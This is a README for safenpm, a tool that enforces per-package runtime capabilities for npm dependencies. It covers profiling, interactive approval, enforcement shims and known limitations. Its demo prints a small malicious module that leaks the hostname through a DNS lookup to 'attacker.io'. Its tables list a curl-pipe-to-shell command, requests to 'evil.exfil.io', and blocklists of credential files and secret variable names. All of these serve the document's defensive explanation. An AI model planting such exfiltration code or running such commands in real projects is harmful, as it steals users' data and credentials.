# safenpm

**Behavioral sandbox for npm packages — per-package runtime capability enforcement.**

safenpm prevents malicious or compromised npm packages from stealing your credentials, exfiltrating data over the network, or spawning unauthorized processes — all without modifying your application code.

---

## The Problem

When you run `npm install`, every package in your dependency tree gains the same runtime privileges as your application: it can read `~/.aws/credentials`, make HTTP requests to any server, and spawn shell commands. A single compromised package in your tree can silently exfiltrate everything.

Python's `venv` only isolates *versions* — it does nothing about runtime capabilities. OS-level containers are heavy and don't give per-package granularity. safenpm fills the gap.

---

## How It Works

```
safenpm install express      ← installs AND profiles capabilities
                             ← prompts you to approve each package interactively
node --require safenpm app   ← runs your app with the enforcer active
```

### The three components

**1. Profiler** — scans your `node_modules` and generates a `package-capabilities.json` file that declares what each package is allowed to do:

```json
{
  "version": "1.0",
  "packages": {
    "express": {
      "fs": { "read": [], "write": [] },
      "net": { "outbound": true, "hosts": ["*"] },
      "env": [],
      "child_process": { "allowed": false },
      "hasNativeModules": false,
      "approvedBy": "auto"
    }
  }
}
```

**2. Interactive approval** — after profiling, safenpm shows you each package's capabilities and asks you to approve, edit, or skip them before writing the policy file. You can narrow permissions package-by-package before a single line of your app runs.

**3. Enforcer** — loaded via `--require` before your application starts. It patches `Module._load` (Node's internal module loader) to intercept every `require()` call — static or dynamic. When a package requires `fs`, `net`, `http`, `https`, `dns`, or `child_process`, it receives a *shim* instead of the real module. Every method call on the shim is checked against the package's profile before execution.

**4. Violation logger** — every blocked or suspicious access is written to `.safenpm-violations.log` and printed to stderr with color-coded severity:
- `CRITICAL` — credential theft attempt (e.g. reading `~/.aws/credentials`)
- `HIGH` — unauthorized network or process spawn
- `MEDIUM` — env mutation
- `LOW` — undeclared env var access (allowed but audited)

### How caller identification works

When a package calls `require('fs')`, Node calls `Module._load('fs', parent, false)`. The `parent` object contains the filename of the calling module — e.g. `/project/node_modules/malicious-pkg/index.js`. safenpm extracts `malicious-pkg` from this path using a regex that correctly handles scoped packages (`@aws-sdk/client-s3`) and nested `node_modules` (monorepo deduplication). If no `node_modules` segment is found, the caller is treated as application code and gets unrestricted access.

### What is blocked

| Attack vector | How it's blocked |
|---|---|
| `readFileSync('~/.aws/credentials')` | fs shim checks path against profile's `fs.read` allowlist |
| `readFileSync('/etc/passwd')` | `isSensitivePath()` flags known credential locations regardless of profile |
| `https.request('evil.exfil.io', ...)` | net/http/https shims check host against profile's `net.hosts` allowlist |
| `dns.lookup('BASE64DATA.evil.io')` | exfil detector flags base64/hex-encoded subdomains as DNS exfiltration |
| `process.env.AWS_SECRET_ACCESS_KEY` | env proxy intercepts `process.env` reads; known secret names return `undefined` |
| `execSync('curl evil.io | sh')` | child_process shim checks `child_process.allowed` before any spawn |
| `require('node:fs').readFileSync(...)` | `node:` prefix is normalized before lookup — same interception applies |
| `const m = 'fs'; require(m)` | `Module._load` intercepts all requires regardless of how the string was built |
| `@scope/malicious-pkg` | Caller resolver handles scoped package names in the path regex |

---

## Installation

```bash
# Clone and install dev dependencies
git clone <repo>
cd safenpm
npm install

# Build the CLI
npm run build

# Link the binary globally (optional)
npm link
```

---

## Usage

### Step 1 — Profile your project and approve capabilities

```bash
# Install a package, profile it, and go through the interactive approval flow
safenpm install express

# Re-profile all currently installed packages (no new install)
safenpm install

# Install multiple packages
safenpm install express lodash axios

# Skip the interactive prompt and auto-approve everything (CI / scripts)
safenpm install express --yes
safenpm install express -y
```

After `npm install` completes, safenpm scans every package in `node_modules`, builds an initial all-deny profile for each one, and opens an **interactive approval session** in your terminal. You work through each package one at a time and decide what it is allowed to do before `package-capabilities.json` is written.

---

## Interactive approval — complete guide

### What you see per package

```
══════════════════════════════════════════════════════
[1 / 4]  axios  v1.6.2
══════════════════════════════════════════════════════
  Filesystem  : No filesystem access
  Network     : No network access
  Env vars    : (none)
  Spawn       : Not allowed
  Native      : No native modules

  [A]pprove  [E]dit permissions  [S]kip  [Q]uit
>
```

The summary shows the **current working profile** for this package. On first run that is always all-deny. The header `[1 / 4]` tells you your position in the queue.

### Top-level choices

| Input | Full word | What happens |
|---|---|---|
| `A` | `approve` | Accept the profile exactly as shown. Writes `approvedBy: "user"` and moves to the next package |
| `E` | `edit` | Enter edit mode to change individual permissions, then approve the result |
| `S` | `skip` | Leave this package at `approvedBy: "auto"` (unapproved). The enforcer will still block it at runtime |
| `Q` | `quit` | Stop the session now. Packages not yet reached stay `approvedBy: "auto"` |

**Tip — when to use each option:**

- Use **A** for packages you trust fully and whose profiled capabilities look correct.
- Use **E** when the profile is too broad (e.g. it shows `net: *` but you only want it to reach one API host), or too narrow (e.g. you know the package needs to read `/tmp`).
- Use **S** for packages you want to revisit later — you can re-run `safenpm install` at any time.
- Use **Q** when you're done for now; packages not yet reviewed remain blocked.

---

### Edit mode — step by step

Type `E` at the main prompt. You enter an edit sub-session for the current package. No changes take effect until you type `done`.

```
══════════════════════════════════════════════════════
[2 / 4]  sharp  v0.33.0
══════════════════════════════════════════════════════
  Filesystem  : No filesystem access
  Network     : No network access
  Env vars    : (none)
  Spawn       : Not allowed
  Native      : Has native modules (.node addons present)

  [A]pprove  [E]dit permissions  [S]kip  [Q]uit
> E

  Edit mode — commands:
    fs read <path>   fs write <path>   net <host>
    env <VAR>        spawn
    show   reset   done   cancel

  edit>
```

#### Filesystem — `fs read` and `fs write`

Allow a package to read or write files by specifying a path or glob pattern:

```
  edit> fs read /tmp/**
  Added: fs.read /tmp/**

  edit> fs read /usr/lib/x86_64-linux-gnu/**
  Added: fs.read /usr/lib/x86_64-linux-gnu/**

  edit> fs write /tmp/**
  Added: fs.write /tmp/**
```

**Path pattern rules:**

| Pattern | What it matches |
|---|---|
| `/tmp/file.txt` | That exact file only |
| `/tmp` | The `/tmp` directory itself and everything under it |
| `/tmp/**` | Everything under `/tmp` (explicit glob form — same result) |
| `~/.config/myapp` | Your home config directory (~ is expanded) |

> **Security note:** Even if you grant `fs read /home/alice/**`, safenpm hard-blocks access to known credential paths (`~/.aws/credentials`, `~/.ssh/id_rsa`, `/etc/passwd`, `/etc/shadow`, `/proc`, `/sys`) regardless of what the profile says. These paths are always `CRITICAL` violations.

**When to grant filesystem access:**

- Image-processing packages (`sharp`, `jimp`) — write intermediate files to `/tmp/**`
- Compiler/build tools — read source files, write output directories
- Config-loading packages — read the specific config file they need, e.g. `/home/user/.myapprc`
- Packages that cache data — allow writes to a dedicated cache directory

**When NOT to grant:**
- General `/**` or `/home/**` patterns — too broad; prefer specific paths
- Write access to source directories — a package should never need to write your `src/`

#### Network — `net <host>`

Allow a package to make outbound TCP connections to a specific hostname:

```
  edit> net registry.npmjs.org
  Added: net registry.npmjs.org

  edit> net api.stripe.com
  Added: net api.stripe.com

  edit> net *.github.com
  Added: net *.github.com
```

**Host pattern rules:**

| Pattern | What it matches |
|---|---|
| `api.stripe.com` | Exact hostname only |
| `*.stripe.com` | Any subdomain of stripe.com |
| `*` | Any host (use only when you fully trust the package) |

> **Note:** Adding a net rule automatically sets `net.outbound: true` in the profile. Without at least one host entry the enforcer treats outbound as disabled even if `outbound: true` is set.

**When to grant network access:**

- HTTP client libraries (`axios`, `node-fetch`) — allow the specific API domains your app calls through them
- Package managers / update checkers — allow `registry.npmjs.org` if appropriate
- Telemetry / analytics packages — evaluate whether you want them to phone home at all; if yes, lock to their specific domain

**When NOT to grant:**
- `*` for packages that should only reach one service — use the specific hostname instead
- Any network access for pure utility packages (`lodash`, `date-fns`, parsers) — they have no legitimate reason to make network calls

#### Environment variables — `env <VAR>`

Allow a package to read a specific environment variable:

```
  edit> env NODE_ENV
  Added: env NODE_ENV

  edit> env PORT
  Added: env PORT

  edit> env DATABASE_URL
  Added: env DATABASE_URL
```

> **Security note:** safenpm maintains a built-in blocklist of ~25 known secret variable names (`AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, `GITHUB_TOKEN`, `STRIPE_SECRET_KEY`, etc.). Even if you grant `env DATABASE_URL`, the enforcer returns `undefined` for any variable on that secret list. To allow a secret env var to reach a package, you must both grant it in the profile **and** verify the package genuinely needs it.

**When to grant env access:**

- Framework config (`NODE_ENV`, `PORT`, `HOST`) — most packages legitimately need these
- Database connection strings — only for the package that directly drives the DB connection
- API keys — only for the specific package that calls that API, and prefer dedicated SDKs that accept keys as constructor arguments rather than reading from env

**When NOT to grant:**
- Broad patterns — each variable must be named explicitly, one at a time
- `AWS_*` variables to packages that aren't the AWS SDK
- Any secret to a package that doesn't have a clear need for it

#### Process spawning — `spawn`

Allow a package to spawn child processes:

```
  edit> spawn
  Added: spawn
```

This sets `child_process.allowed: true`. There are no sub-options in the interactive UI — to restrict which executables are allowed, edit `package-capabilities.json` manually after the session and add an `allowedCommands` array:

```json
"child_process": {
  "allowed": true,
  "allowedCommands": ["git", "node"]
}
```

**When to grant spawn:**

- Build tools (`node-gyp`, `esbuild`, `webpack`) — they need to run compilers
- Git integration packages — they shell out to `git`
- Test runners — they may fork worker processes

**When NOT to grant:**
- Any package where spawning is not clearly required — this is the highest-risk capability
- Pure data-processing, parsing, or utility packages

#### Inspecting the current state — `show`

At any point in edit mode, type `show` to see the profile as it currently stands with all your edits applied:

```
  edit> show

  Filesystem  : Read: [/tmp/**, /usr/lib/**]   Write: [/tmp/**]
  Network     : Outbound allowed  hosts: [api.stripe.com]
  Env vars    : NODE_ENV
  Spawn       : Not allowed
  Native      : Has native modules
```

Use this before typing `done` to confirm you haven't missed anything.

#### Clearing all edits — `reset`

Wipes every permission you've added in this session back to all-deny:

```
  edit> reset
  Reset to all-deny.
```

Useful when you've made a mistake or want to start the edit over from scratch. The package is not skipped — you continue in edit mode.

#### Finishing or cancelling an edit

| Command | Effect |
|---|---|
| `done` | Approve the current edited profile. Moves to next package |
| `cancel` | Discard all edits. Returns to the `[A]pprove [E]dit [S]kip [Q]uit` prompt for the **same** package — you can then approve the original profile, skip, or re-enter edit mode |

---

### Auto-approve (non-interactive)

Pass `--yes` or `-y` to skip the approval session entirely and mark all profiles `approvedBy: "user"` automatically:

```bash
safenpm install --yes
safenpm install lodash axios -y
```

This is appropriate for:
- CI pipelines where interactive prompts aren't possible
- Projects where you've already reviewed the packages manually
- Development environments where you want to get running quickly and tighten up later

**Warning:** `--yes` stamps every package as user-approved without review. For production deployments, prefer the interactive flow so you know exactly what each package is allowed to do.

---

### Editing profiles manually after the session

`package-capabilities.json` is a plain JSON file — you can edit it at any time without re-running `safenpm install`:

```json
{
  "version": "1.0",
  "packages": {
    "axios": {
      "version": "1.6.2",
      "fs": { "read": [], "write": [] },
      "net": {
        "outbound": true,
        "hosts": ["api.stripe.com", "api.github.com"]
      },
      "env": ["NODE_ENV"],
      "child_process": { "allowed": false },
      "worker_threads": false,
      "hasNativeModules": false,
      "approvedBy": "user",
      "approvedAt": "2024-01-15T10:35:00Z",
      "userNote": "HTTP client — only reaches Stripe and GitHub APIs"
    }
  }
}
```

After editing the file, restart your application — the enforcer reads the file on startup, so no rebuild is needed.

**To re-run the approval session for all packages:**
```bash
safenpm install   # re-profiles node_modules, opens approval session again
```

**To check what's currently approved:**
```bash
safenpm status
# [safenpm] 4 package(s) profiled:
#   axios@1.6.2        [net]
#   sharp@0.33.0       [fs, native]
#   lodash@4.17.21     [no access]
#   node-gyp@10.0.1    [fs, spawn]
```

---

### Step 2 — Run your app with the enforcer

```bash
# Development
node --require safenpm/dist/enforcer/index.js src/index.js

# With ts-node
node --require safenpm/dist/enforcer/index.js --require ts-node/register src/index.ts

# With environment variable (applies to all node invocations in shell)
export NODE_OPTIONS="--require safenpm/dist/enforcer/index.js"
node src/index.js
```

### Step 3 — Review violations

```bash
# View the violation log
cat .safenpm-violations.log

# Check currently profiled packages
safenpm status
```

### Example violation output

```
[safenpm] BLOCKED [CRITICAL] malicious-pkg attempted: readFileSync(/home/user/.aws/credentials)
  Reason: CREDENTIAL_THEFT_ATTEMPT
  Package: malicious-pkg@1.0.0
```

---

## Real-world demo: sneaky-sorter

This is a worked example of a supply-chain attack and how safenpm stops it.

### The malicious package

`sneaky-sorter` is a legitimate-looking utility that sorts integer arrays. Its `index.js` exports a simple `sort(arr)` function — but hidden in the module initializer is a DNS lookup:

```js
// sneaky-sorter/index.js
const dns = require('dns')
const os  = require('os')

// Hidden exfiltration: resolves a subdomain encoding the hostname
dns.lookup(
  Buffer.from(os.hostname()).toString('hex') + '.attacker.io',
  () => {}   // fire-and-forget
)

function sort(arr) { return [...arr].sort((a, b) => a - b) }
module.exports = { sort }
```

The DNS call runs the instant any application does `require('sneaky-sorter')`.

### The vulnerable API

`sort-api` is a simple HTTP server:

```js
const http = require('http')
const { sort } = require('sneaky-sorter')

http.createServer((req, res) => {
  // POST /sort  →  { numbers: [3,1,2] }  →  { sorted: [1,2,3] }
  let body = ''
  req.on('data', chunk => body += chunk)
  req.on('end', () => {
    const { numbers } = JSON.parse(body)
    res.end(JSON.stringify({ sorted: sort(numbers) }))
  })
}).listen(3000)
```

**Without safenpm**: the DNS call fires on every server start, silently exfiltrating the machine's hostname.

### Setting up safenpm

```bash
cd sort-api
safenpm install sneaky-sorter
# → profiles sneaky-sorter, shows it wants net access
# → approve with A, or narrow to specific hosts with E → net <specific-host> → done

node --require safenpm/dist/enforcer/index.js app.js
```

**With safenpm running** and `sneaky-sorter` having no net permission, the DNS call is blocked:

```
[safenpm] BLOCKED [HIGH] sneaky-sorter attempted: dns.lookup(abc123.attacker.io)
  Reason: DNS_BLOCKED_NO_NET_PERMISSION
  Package: sneaky-sorter@1.0.0
```

The sort API continues to work — only the hidden exfiltration is stopped.

---

## The capability profile format

`package-capabilities.json` lives at your project root. You can edit it manually or use the interactive approval flow to generate it.

```json
{
  "version": "1.0",
  "generatedAt": "2024-01-15T10:30:00Z",
  "projectRoot": "/home/user/my-project",
  "packages": {
    "sharp": {
      "version": "0.33.0",
      "fs": {
        "read":  ["/tmp/**", "/usr/lib/**"],
        "write": ["/tmp/**"]
      },
      "net": { "outbound": false, "hosts": [] },
      "env": [],
      "child_process": { "allowed": false },
      "worker_threads": false,
      "hasNativeModules": true,
      "approvedBy": "user",
      "approvedAt": "2024-01-15T10:35:00Z",
      "userNote": "Image processing — needs /tmp for intermediate files"
    }
  }
}
```

### Field reference

| Field | Type | Description |
|---|---|---|
| `fs.read` | `string[]` | Path patterns the package may read. Supports exact paths, `/dir/**` globs |
| `fs.write` | `string[]` | Path patterns the package may write |
| `net.outbound` | `boolean` | Whether any outbound connections are allowed |
| `net.hosts` | `string[]` | Allowed hostnames. `*` = any, `*.example.com` = subdomain wildcard |
| `env` | `string[]` | Environment variable names the package may read |
| `child_process.allowed` | `boolean` | Whether the package may spawn processes |
| `child_process.allowedCommands` | `string[]?` | If set, restricts which executables may be spawned |
| `worker_threads` | `boolean` | Whether the package may create worker threads |
| `hasNativeModules` | `boolean` | Auto-detected. Native `.node` addons bypass JS-level shims |
| `approvedBy` | `"auto"\|"user"\|"registry"` | Who approved this profile. Only `"user"` is enforced with full trust |

---

## Project structure

```
safenpm/
├── src/
│   ├── capabilities/
│   │   ├── schema.ts          # Central TypeScript interfaces (PackageCapability, Violation, etc.)
│   │   ├── path-matcher.ts    # Path allowlist matching with glob support
│   │   ├── reader.ts          # Load package-capabilities.json from disk
│   │   └── writer.ts          # Write package-capabilities.json to disk
│   ├── enforcer/
│   │   ├── index.ts               # Entry point — installs Module._load + fetch interceptors
│   │   ├── module-interceptor.ts  # Patches Module._load, routes require() to shims
│   │   ├── fetch-interceptor.ts   # Patches globalThis.fetch (Node 18+ bypass fix)
│   │   ├── caller-resolver.ts     # Identifies which npm package made a require() call
│   │   ├── violation-logger.ts    # Writes violations to log file + stderr
│   │   └── shims/
│   │       ├── fs.shim.ts         # Intercepts fs module (16 read ops, 10 write ops)
│   │       ├── env.proxy.ts       # Proxy around process.env
│   │       ├── net.shim.ts        # Intercepts net.connect / net.createConnection
│   │       ├── http.shim.ts       # Intercepts http.request / http.get
│   │       ├── https.shim.ts      # Intercepts https.request / https.get
│   │       ├── dns.shim.ts        # Intercepts DNS lookups + exfiltration detection
│   │       ├── child-process.shim.ts  # Intercepts exec/spawn/fork
│   │       ├── fetch.shim.ts      # Wraps globalThis.fetch — enforces net.hosts at call time
│   │       └── net-helpers.ts     # Shared host resolution and checking logic
│   ├── profiler/
│   │   ├── index.ts           # Orchestrator — resolver + native-detector + profile-builder
│   │   ├── package-resolver.ts    # Reads node_modules, returns installed package list (symlink-aware)
│   │   ├── native-detector.ts     # Detects .node binary addons recursively
│   │   ├── profile-builder.ts     # Converts observations → PackageCapability
│   │   └── registry-client.ts     # Fetches download counts from npm registry
│   ├── ui/
│   │   ├── approval-prompt.ts     # formatProfile() — human-readable capability summary
│   │   ├── diff-display.ts        # diffProfiles() — detects capability changes between versions
│   │   └── interactive-approval.ts  # Full interactive approval session (parseApprovalInput,
│   │                                #   parseEditCommand, applyEdit, resetProfile,
│   │                                #   runApprovalSession, createReadlineIO)
│   ├── cli/
│   │   ├── index.ts           # CLI entry point — routes to commands
│   │   ├── install.ts         # `safenpm install` — npm install + profile + approve + write
│   │   └── args.ts            # parseArgs() — pure CLI argument parser (--yes/-y flag)
│   └── utils/
│       ├── path-resolver.ts   # Resolves ~, relative, and absolute paths
│       ├── secret-detector.ts # Identifies credential env var names by name + pattern
│       ├── exfil-detector.ts  # Detects base64/hex-encoded subdomains (DNS exfiltration)
│       └── stack-parser.ts    # Parses v8 Error.stack into structured StackFrame[]
├── test/
│   ├── fixtures/              # Simulated malicious and legitimate npm packages
│   │   ├── malicious-fs/      # Reads ~/.aws/credentials, readdirSync(home), statSync(.ssh)
│   │   ├── malicious-env/     # Reads AWS_SECRET_ACCESS_KEY, DATABASE_URL, custom secrets
│   │   ├── malicious-net/     # https.request to evil.exfil.io
│   │   ├── malicious-dns/     # DNS lookup with base64-encoded exfiltration subdomain
│   │   ├── malicious-spawn/   # execSync shell command, spawn('sh', ...)
│   │   ├── malicious-node-prefix/  # Uses require('node:fs') to attempt bypass
│   │   ├── malicious-fetch/        # Uses globalThis.fetch() — bypasses require() entirely
│   │   └── legitimate-package/     # Well-behaved package — reads /tmp, reads NODE_ENV
│   ├── helpers/
│   │   └── run-with-enforcer.ts    # Integration test helper — spawns child processes
│   ├── unit/                  # Unit tests across all modules
│   └── integration/           # Integration tests — spawns real child processes with enforcer
├── package-capabilities.json  # Generated by `safenpm install` (your project's policy file)
├── .safenpm-violations.log    # Runtime violation log (appended to during execution)
├── TASKS.md                   # Full TDD task checklist (all tasks completed)
├── BUILD_LOG.md               # Detailed build history with decisions and fixes
└── PLAN.md                    # Original implementation plan
```

---

## Development

```bash
# Run all tests
npm test

# Run only unit tests
npm run test:unit

# Run only integration tests
npm run test:integration

# Watch mode during development
npm run test:watch

# Type check without emitting
npx tsc --noEmit

# Lint
npm run lint
```

### Test results

```
32 test files   378 tests   0 failures
```

Tests are organized by TDD discipline: every test was written before its implementation. Integration tests spawn real child processes with the enforcer loaded via `--require`, verifying end-to-end behaviour against realistic attack fixtures. The interactive approval module (`interactive-approval.ts`) is tested via the injectable `ApprovalIO` interface — no real readline session required.

---

## Security model and limitations

**What safenpm protects against:**
- Malicious packages reading credential files (`~/.aws/credentials`, `~/.ssh/id_rsa`, `/etc/shadow`)
- Environment variable theft (`AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, and 24+ known secret names)
- Unauthorized outbound HTTP/HTTPS/TCP connections
- DNS exfiltration via base64/hex-encoded subdomains
- Unauthorized process spawning and shell injection
- `node:fs` prefix bypass (Node 14.18+ syntax)
- Dynamic `require()` bypass attempts

**Current limitations (known):**

- **Native modules bypass JS shims.** Packages with `.node` binary addons run native code that `Module._load` cannot intercept. safenpm detects and flags these with `hasNativeModules: true` so you can decide whether to trust them.

- **ESM (`.mjs`) is not intercepted.** The `Module._load` patch only covers CommonJS. ES module interception requires a separate `--experimental-loader` hook (planned).

- **Global `fetch()` is intercepted.** Node 18+ ships a global `fetch` that bypasses `require()` entirely. safenpm patches `globalThis.fetch` on startup so packages that call `fetch()` directly — without ever touching `require('http')` — are still subject to the same `net.hosts` allowlist enforcement. String URLs, `URL` objects, and `Request` objects are all handled.

- **`process.binding()` and `vm.runInNewContext()` are not intercepted.** Advanced bypass vectors that access Node internals directly or evaluate code in a fresh VM context can bypass `Module._load` entirely.

- **Worker threads are not intercepted.** Code running in a `worker_threads` Worker starts a new JS context without the enforcer loaded.

- **Profiles are auto-generated as all-deny.** The profiler doesn't yet run install scripts in a sandbox to observe real behavior — it generates conservative deny-all profiles that users can expand via the interactive approval flow.

- **No registry consensus yet.** The `approvedBy: 'registry'` tier (crowd-sourced profiles) is designed but not yet populated.

---

## How it differs from other tools

| Tool | What it does | What it misses |
|---|---|---|
| `npm audit` | Reports known CVEs | Can't stop a 0-day or a new malicious package |
| `socket.dev` | Static analysis at install time | Can't enforce at runtime |
| `venv` (Python) | Version isolation only | No capability enforcement |
| Docker/containers | OS-level isolation | Per-package granularity, heavy setup |
| **safenpm** | Runtime capability enforcement per package, interactive approval UI, global fetch interception | Native addons, ESM |

---

## License

MIT
